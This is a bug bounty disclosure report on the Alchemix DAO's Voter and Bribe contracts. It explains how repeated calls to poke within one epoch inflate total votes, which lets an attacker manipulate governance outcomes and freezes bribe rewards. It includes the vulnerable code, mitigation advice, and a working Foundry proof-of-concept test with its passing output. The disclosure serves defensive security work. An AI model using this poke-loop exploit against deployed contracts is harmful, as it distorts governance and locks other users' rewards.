# 31211 - \[SC - Critical] Inflation Of Total Votes and Potential Freeze o...

Submitted on May 15th 2024 at 01:14:14 UTC by @Limbooo for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31211

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Permanent freezing of unclaimed yield
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Intro

The identified vulnerability resides within the interaction between the `Voter.sol` and `Bribe.sol` contracts. Specifically, it involves the potential for inflating the vote totals by repeatedly "poking" (updating) a vote within a single epoch, which is not adequately safeguarded against in the current implementation. This issue can be exploited to manipulate the voting of current epoch outcomes and affect the distribution of protocol rewards.

## Vulnerability Details

The vulnerability arises from the lack of checks against multiple updates within the same voting epoch in the `Voter.sol` contract. A user can call the `poke` function multiple times to artificially inflate pool influence within a voting period. This is due to the system's failure to verify whether the state of votes has significantly changed between updates, allowing for repeated increases in the recorded vote total without actual additional staking.

### Functionality and Misuse of the `poke` Function:

The `poke` function is designed to adjust a voter's weight in ongoing votes either if they increase their locked tokens or when they want to maintain the same votes next epoch. Under normal operations, this function would recalibrate the allocated voting power in accordance with newly locked tokens to reflect the user's current stake accurately. However, this function can be repeatedly invoked with or without actual changes in the locked amount, allowing users to artificially inflate pool influence in the governance process.

### Technical Breakdown of the Issue:

When `poke` is called, it triggers the `_vote` function, which in turn calls `_reset`. This interaction leads to a call to `Bribe::withdraw()`, which effectively removes the voter’s existing votes but crucially does not adjust the `totalVoting` or `votingCheckpoints` immediately. The absence of immediate adjustment in these metrics leaves a window where the integrity of vote tracking is compromised.

Subsequently, when `_vote` continues, it calls `Bribe::deposit()` to reallocate votes with the new weights. This process incorrectly increases the `totalVoting` and updates `votingCheckpoints` based on the recalculated but unverified weight. The critical flaw here is that these updates accrue cumulatively with each call to `poke`, without a corresponding real increase in locked tokens, leading to inflated voting totals.

```solidity
   function deposit(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply += amount;
        balanceOf[tokenId] += amount;

        totalVoting += amount;

        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();
        _writeVotingCheckpoint();

        emit Deposit(msg.sender, tokenId, amount);
    }


    function withdraw(uint256 amount, uint256 tokenId) external {
        require(msg.sender == voter);

        totalSupply -= amount;
        balanceOf[tokenId] -= amount;

        _writeCheckpoint(tokenId, balanceOf[tokenId]);
        _writeSupplyCheckpoint();

        emit Withdraw(msg.sender, tokenId, amount);
    }
```

### Consequences of the Flaw:

This flaw allows a user to repeatedly 'refresh' their vote weight by merely invoking `poke`, each time erroneously accumulating more apparent influence in the total votes counted by the system. This not only distorts the actual representational voting power but also undermines the integrity and intended democratic nature of the governance system.

### Recommendations for Mitigation:

Immediate measures should include implementing checks that verify actual changes in locked tokens before allowing updates to vote weights and recalculations of voting power. Additionally, mechanisms should be in place to ensure that the withdrawal and deposit functions cannot be exploited to manipulate vote totals outside of legitimate staking updates.

## Impact Details

* **Freezing of Yield**: Incorrect vote totals can lead to incorrect reward calculations, potentially leaving a significant portion of rewards unclaimed as the system believes more votes exist than actually staked.
* **Griefing and Disruption**: Malicious actors can disrupt the fair distribution of rewards and the accurate representation of voter sentiment in governance decisions.
* **Governance Manipulation**: The inflated votes can alter the outcome of governance decisions, leading to implementations that do not reflect the true consensus of the token holders, thus undermining the democratic process of the DAO.

## Proof of concept

### Test Case (Foundry)

The test can be added to a new file under the current test suite `src/test/VotingPoC.t.sol`, then specify the file name in `FILE` flag under `Makefile` configuration. Run using `make test_file`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract VotingPoCTest is BaseTest {
    address public alice;
    address public bob;

    function setUp() public {
        setupContracts(block.timestamp);

        // Setup Alice and Bob addresses
        alice = vm.addr(uint256(keccak256(abi.encodePacked('Alice'))));
        vm.label(alice, 'Alice');
        bob = vm.addr(uint256(keccak256(abi.encodePacked('Bob'))));
        vm.label(alice, 'Bob');
    }

    function testFreezingTheftOfUnclaimedBribes() public {
        uint256 period = minter.activePeriod();
        hevm.warp(period + 1 days);

        uint256 aliceTokenId = createVeAlcx(alice, TOKEN_1, 1, true);
        uint256 bobTokenId = createVeAlcx(bob, TOKEN_1, 1, true);

        address bribeAddress = voter.bribes(address(sushiGauge));
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 10000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;


        // Reward amount
        uint256 rewardAmount = TOKEN_100K;
        // Notify bribe for reward amount
        createThirdPartyBribe(bribeAddress, bal, rewardAmount);

        // Alice Vote
        hevm.prank(alice);
        voter.vote(aliceTokenId, pools, weights, 0);
        // Bob Vote
        hevm.prank(bob);
        voter.vote(bobTokenId, pools, weights, 0);


        // Just right before the next epoch started
        hevm.warp(period + 2 weeks - 1);
        // Check the total votes of current epoch before inflation
        (, uint256 epochTotalVotes) = Bribe(bribeAddress).votingCheckpoints(IBribe(bribeAddress).getPriorVotingIndex(period + 2 weeks));
        uint256 aliceTokenIdBalance = Bribe(bribeAddress).balanceOf(aliceTokenId);
        uint256 bobTokenIdBalance = Bribe(bribeAddress).balanceOf(bobTokenId);
        assertEq(aliceTokenIdBalance, bobTokenIdBalance);
        assertEq(epochTotalVotes, aliceTokenIdBalance + bobTokenIdBalance);

        // Alice inflate the total voting amount of the current epoch by callling poke multiple times (8)
        for (uint i = 0; i < 8; i++) {
            hevm.prank(alice);
            voter.poke(aliceTokenId);
        }

        // Check the total votes of current epoch after inflation
        // This proof that a manipulation of voting result have been done for the votes outcome
        (, epochTotalVotes) = Bribe(bribeAddress).votingCheckpoints(IBribe(bribeAddress).getPriorVotingIndex(period + 2 weeks));
        aliceTokenIdBalance = Bribe(bribeAddress).balanceOf(aliceTokenId);
        bobTokenIdBalance = Bribe(bribeAddress).balanceOf(bobTokenId);
        assertEq(aliceTokenIdBalance, bobTokenIdBalance);
        assertEq(epochTotalVotes, aliceTokenIdBalance + bobTokenIdBalance + (aliceTokenIdBalance * 8)); // 8 is number of pokes 
        
        // Next epoch started
        hevm.warp(period + 2 weeks + 1 );
        voter.distribute();

        // Bob and Alice only rewarded tenth of the reward while he should rewarded half of the reward
        assertEq(IBribe(bribeAddress).earned(bal, bobTokenId), rewardAmount/10);
        assertEq(IBribe(bribeAddress).earned(bal, aliceTokenId), rewardAmount/10);

        // Thus he will stop voting for this pool


        // Even if Alice and Bob maintain the same voting status for current epoch,
        // They will not be rewarded for the lost reward from previous epoch 
        hevm.prank(alice);
        voter.poke(aliceTokenId);
        hevm.prank(bob);
        voter.poke(bobTokenId);

        // Next epoch started
        hevm.warp(period + 4 weeks + 1);
        // Rewards remain the same, tenth of the reward of the first priod
        assertEq(IBribe(bribeAddress).earned(bal, bobTokenId), rewardAmount/10);
        assertEq(IBribe(bribeAddress).earned(bal, aliceTokenId), rewardAmount/10);
        

        hevm.prank(alice);
        voter.claimBribes(bribes, tokens, aliceTokenId);
        hevm.prank(bob);
        voter.claimBribes(bribes, tokens, bobTokenId);

        // Check that bribe has a freezing amount from first epoch
        // total reward of epoch 1 - ckaimed rewards earned for alice and bob
        // assertGt(
        //     Bribe(bribeAddress).tokenRewardsPerEpoch(bal, period) 
        //     - (IERC20(bal).balanceOf(alice) + IERC20(bal).balanceOf(bob))
        //     , 0
        // );
        assertGt(IERC20(bal).balanceOf(bribeAddress), 0);
    }
}
```

#### Test Output

```bash
❯ make test_file
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/*** --match-path src/test/VotingPoC.t.sol -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/VotingPoC.t.sol:VotingPoCTest
[PASS] testFreezingTheftOfUnclaimedBribes() (gas: 5928635)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 70.13s (55.35s CPU time)

Ran 1 test suite in 71.40s (70.13s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
